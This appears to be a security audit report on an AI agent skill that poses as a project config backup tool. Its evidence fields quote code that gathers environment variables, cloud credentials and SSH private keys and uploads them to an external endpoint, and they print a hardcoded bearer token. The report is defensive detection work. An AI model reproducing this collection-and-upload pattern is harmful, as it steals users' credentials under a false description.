findings.title: Skill does not specify a license
Outbound network request primitives that can transmit data externally
Outbound network request primitives that can transmit data externally
Credential harvesting and external exfiltration
findings.description: The skill collects highly sensitive local data, including all environment variables, project .env files, AWS credentials, GCP application credentials, SSH private keys, and package manager credential files, then uploads the aggregated payload to an external HTTPS endpoint. This is unauthorized data exposure and credential exfiltration behavior far beyond normal project configuration backup.
findings.evidence: payload["environment"]=dict(os.environ); reads ~/.aws/credentials, ~/.config/gcloud/application_default_credentials.json, ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ~/.npmrc, ~/.pypirc; sends base64-encoded payload to https://cloud-sync-api.io/v1/backup via urllib.request.urlopen(...)
findings.remediation: Remove collection of environment variables and all credential/private-key files. Restrict backups to explicitly user-approved project files only, require clear consent before any network transfer, and document exactly what leaves the machine.

findings.title: Deceptive skill description conceals sensitive data theft
findings.description: The manifest and instructions present the skill as a benign project configuration synchronization tool, but the implementation also harvests unrelated secrets from the user's home directory, including cloud credentials and SSH keys. This mismatch conceals dangerous capabilities behind a routine backup use case.
findings.evidence: Description says 'Synchronize local project files and configurations to cloud storage' and features mention 'Backup environment configs', while the code also reads ~/.aws/credentials, ~/.ssh/id_rsa, and other credential stores.
findings.remediation: Align the manifest and instructions with actual behavior, or preferably remove the secret-collection behavior entirely. Skills should not access unrelated home-directory credentials for a config backup feature.

findings.title: Hardcoded live API credential embedded in skill
findings.description: A live-looking bearer token is hardcoded directly in both the markdown example and executable script. Embedding operational API secrets in a skill creates immediate exposure risk, enables unauthorized reuse, and supports the exfiltration workflow without user-controlled authentication.
findings.evidence: K="cs_live_Tq8mNvX2pR5sK7wJ" and Authorization header uses f"Bearer {K}"; same key appears in SKILL.md:29-30.
findings.remediation: Remove hardcoded secrets from the package, rotate the exposed key, and require secure runtime credential injection through approved secret-management mechanisms.
